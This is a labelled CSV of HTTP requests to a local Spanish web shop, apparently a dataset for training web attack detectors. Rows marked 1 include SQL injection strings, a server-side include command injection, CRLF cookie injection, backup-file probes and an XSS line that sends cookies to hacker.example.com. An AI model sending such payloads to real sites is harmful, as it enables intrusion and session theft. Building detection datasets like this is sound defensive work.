URL,Target
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=oliveira&password=62ST8R1A9O&nombre=Floriana&apellidos=Malapeir+Cavaller&email=cotten%40comodepilarse.cm&dni=06773874Y&direccion=Cuesta+Sagrado+Corazon%2C+155+5%3FA&ciudad=Orist%E0&cp=26586&provincia=Madrid&ntc=5076820691273276&B1=Registrar ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/asf-logo-wide ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=menaker&password=aUseNT%2BE&nombre=Bethania&apellidos=Torrande+Gaitan&email=wostrikoff%40hojainformativas.gi&dni=03482859S&direccion=C%2F+Bernat+y+Baldovi%2C+32+6-G&ciudad=Solanillos+del+Extremo&cp=39696&provincia=Guadalajara&ntc=8480127021010451&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp/.Bak ,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/4861362529278789730.inc ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=d%2Fmsrtime&pwd=5872ra&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&login=swen&pwd=incisorio&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=toshach&pwdA=qUeR4N55a&remember=off&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shing-mi&pwd=d9s1a1i89&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide.gif.bak ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%3F ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/6909030637832563290.jsp.inc ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6894&B1=Confirmar ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/4861362529278789730.java ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080.bak ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jongwoei&password=dason%F3mica&nombre=Elois&apellidos=Cubi%F1a+Cajahuanca&email=imaz.leftwich%40culturalsanpedrocf.no&dni=11653982C&direccion=General+Moscardo+89%2C+&ciudad=Quintanar+de+la+Orden&cp=34485&provincia=Toledo&ntc=2425930139286993&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=perrotta4&password=-fortificaci%F3n&nombreA=Temistocles&apellidos=Bastidas+Lacruz&email=butch%407horas.coop&dni=64652659G&direccion=Calle+Cristo+86%2C+2G&ciudad=Berrocalejo+de+Aragona&cp=10520&provincia=Girona&ntc=8239878600110127&B1=Registrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp/ ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=usa9&password=ENjuaGaDiEnTES&nombre=Johana&apellidos=Colldevall&email=scepi%4014horas.ao&dni=04746545N&direccion=Ro*nda+Ebre%2B%2C+144+5-*D&ciudad=Villota+del+P%E1ramo&cp=43694&provincia=La+Rioja&ntc=0365839887327935&B1=Registrar ,1
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=85&cantidad=59&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=celso&pwd=desvarar&remember=on&B1=Entrar%22+AND+%221%22%3D%221 ,1
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=elliot&password=matosa&nombre=Abd%F3n&apellidos=Andreu+Agraso&email=takakura%40cenitsoria.sb&dni=80216904B&direccion=Avinguda+Mas+Fuster+175+8B&ciudad=Fuente-%C1lamo&cp=48112&provincia=Tarragona&ntc=0683879802529946&B1=Registrar ,0
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8166&B1=Confirmar%2F ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rosebud&password=8o881si9le&nombre=F%E9&apellidos=Chaucon+Caban%E9&email=alisik-koller%40coreserv.zm&dni=42773884W&direccion=Gaviota+13+&ciudad=Emperador&cp=48508&provincia=Girona&ntc=4774034057366562&B1=Registrar ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/imagenes/3.gif/asf-logo-wide.gif/.bak ,1
http://localhost:8080/tienda1.old ,1
http://localhost:8080/asf-logo-wide.gif/.bak ,1
http://localhost:8080/samples/isapi/srch.htm ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif/asf-logo-wide.gif~ ,1
http://localhost:8080/tienda1/index.jsp ,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif~ ,1
http://localhost:8080/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/CFIDE/administrator/welcomefooter.cfm ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif.INC ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp/asf-logo-wide.gif/ ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrarAND+1%3D1&login=raymund&pwd=pist%F3n&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/publico/registro.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ratnam&pwd=macrura&remember=off&B1=Entrar ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,0
http://localhost:8080/tienda1/asf-logo-wide ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sparks&pwd=569t179e&remember=on%2F&B1=Entrar ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/publico/carrito.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp.java ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=25&B1=A%F1adir+al+carrito ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Confirmar ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ploof&password=g47d8%F16ador&nombre=Virma&apellidos=Llarden+Romeu&email=%40ghosh%40venderf%40otografias.ae&dni=31881769C&direccion=Calle+Picos+De+Europa%2C+65+1%3FH&ciudad=Dehesa+de+Romanos&cp=33870&provincia=Burgos&ntc=6103925352151214&B1=Registrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%7C&password=40fi6eres5a&nombre=Salustiano&apellidos=Elguezabal+Brot%F3&email=magarill%40beljos.gi&dni=51095089Z&direccion=Zurbaran%2C+54%2C+&ciudad=F%E9rez&cp=10613&provincia=Salamanca&ntc=8908099424894248&B1=Registrar ,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/tienda1/imagenes/3.gif ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080.Old ,1
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/global/menum.jsp/asf-logo-wide.gif ,1
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85%2F&cantidad=91&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=burkhard&pwd=EngeNdraR&remember=on&B1=Entrar ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/miembros/editar.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/entrar.jsp ,0
http://localhost:8080/tienda1/miembros/salir.jsp/asf-logo-wide.gif/.bak ,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cleve&password=guiSada&nombre=Lila&apellidos=Fen%E9s+Montanuy&email=bekkouche%40aadsl.hu&dni=74492868P&direccion=Padre+Isla%2C+S%2FN%2C+&ciudad=Castrillo+de+Duero&cp=48950&provincia=Baleares+%28Illes%29&ntc=648492740335689&B1=Registrar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/jstl-war/index.html ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=natiuk&password=0estot32&nombre=Manquel&apellidos=Peraferr&email=riento%40maison-cadaques.gd&dni=79506626L&direccion=Calle+Sol+S%2FN%2C+&ciudad=Maello&cp=42113&provincia=Vizcaya&ntc=1666522520422230&B1=Registrar ,0
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kapil&password=d1c36o4ca&nombre=Berina+del+Valle&apellidos=Artico&email=meunier.langa%40tintasultravioleta.al&dni=17826694S&direccion=C%2F+Historiador+Rodrigo+Pertegas%2C+149%2C+8-E&ciudad=Palafolls&cp=25218&provincia=C%E1ceres&ntc=3256313581077416&B1A=Registrar ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg ,0
http://localhost:8080/tienda1/publico/entrar.jsp ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=lotfalia&password=prestancIa&nombre=Dip&apellidos=Miravet+Leserre&email=bois%40awat.vi&dni=49100388B&direccion=C%2F+Maestro+Macias%2C+77%2C+3C&ciudad=V.istabella+del+M.aes%3Ftrazgo&cp=46838&provincia=Lleida&ntc=8266692511685831&B1=Registrar ,1
http://localhost:8080/tienda1/publico/registro.jsp ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25 ,1
http://localhost:8080/tienda1/imagenes/2.gif ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=badger&password=enteNdImienTo&nombre=Neleo&apellidos=Llaveria+Magnieto&email=sternikova%40clo2.mg&dni=16471396S&direccion=Casa+De+La+Misericordia+12+&ciudad=Sukarrieta&cp=19492&provincia=Lleida&ntc=5939892220484174&B1=Registrar ,0
http://localhost:8080/tienda1/global/menum.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito ,1
http://localhost:8080/msadc/adcjavas.inc ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=72&B1=A%F1adir+al+carrito ,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg ,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registroAND+1%3D1&login=shanti&password=aSolApar&nombre=Meyer&apellidos=Balsells+Fit%E9&email=meeker_komorowska%40noviasteresapalacios.mx&dni=19254444V&direccion=Calle+Santo+Domingo%2C+163+&ciudad=Lapoblaci%F3n&cp=43762&provincia=Salamanca&ntc=3963417251339822&B1=Registrar ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilie&password=v9n939z6&nombre=Gina&apellidos=Subir%F3s+Figaredo&email=urchins%40waikilu.mg&dni=93698052P&direccion=Gredos%2C+114+12%3FG&ciudad=Castroverde&cp=05520&provincia=Burgos&ntc=7277765230207053&B1=Registrar ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/6909030637832563290.jsp.inc ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas ,0
http://localhost:8080/tienda1/imagenes/logo.gif ,0
http://localhost:8080/tienda1/publico/anadir.jsp ,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hauersto%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=angeL%F3n&remember=on&B1=Entrar ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3400%2B&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hurwitz&password=P7rdUlarIo&nombre=Yasmila&apellidosA=Raquer+De+la+Poza&email=kober%40sindns.ve&dni=24117332S&direccion=Calle+Barri+Trinitat+Nova%2C+S%2FN%2C+13D&ciudad=Parra+de+las+Vegas%2C+La&cp=12709&provincia=Le%F3n&ntc=1828745224462815&B1=Registrar ,1
http://localhost:8080/tienda1/publico/productos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%4040 ,1
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pallen&password=b%2Brigola&nombre=Ronen&apellidos=Albiol&email=pettingell%40psychominders.md&dni=27047841W&direccion=Plaza+Del+Yunque%2C+4%2C+&ciudad=Zarrat%F3n&cp=37766&provincia=Palencia&ntc=0650065659557709&B1=Registrar ,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg ,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E ,1
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7334bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&B1=Confirmar ,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 ,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif ,0
http://localhost:8080/_cti_pvt/linkinfo.cnf ,1
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=85&cantidad=73&B1=A%F1adir+al+carrito ,1
http://localhost:8080/statmail.nsf ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/salir.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,1
http://localhost:8080/tienda1/miembros/index.jsp.Inc ,1
http://localhost:8080/tienda1/global/titulo.jsp ,0
http://localhost:8080/tienda1/publico/autenticar.jsp ,1
http://localhost:8080/tienda1/publico/miembros.jsp ,0
http://localhost:8080/tienda1/global/creditos.jsp ,0
http://localhost:8080/tienda1/miembros/fotos.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp ,1
http://localhost:8080/tienda1/publico/pagar.jsp ,0
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235 ,1
http://localhost:8080/tienda1/miembros/index.jsp ,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8460&B1=%22+AND+%221%22%3D%221 ,1
http://localhost:8080/tienda1/global/estilos.css ,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mohsen&password=obsequ.iosa&nombre=Emil&apellidos=Escriv%E1&email=martinsan.broughton%40etxarriaranatz.ck&dni=74725623A&direccion=Plaza+Cruz+Ca%F1amelar+S%2FN%2C+&ciudad=Castej%F3n+de+Tornos&cp=40142&provincia=Burgos&ntc=9854854946355075&B1=Registrar ,0
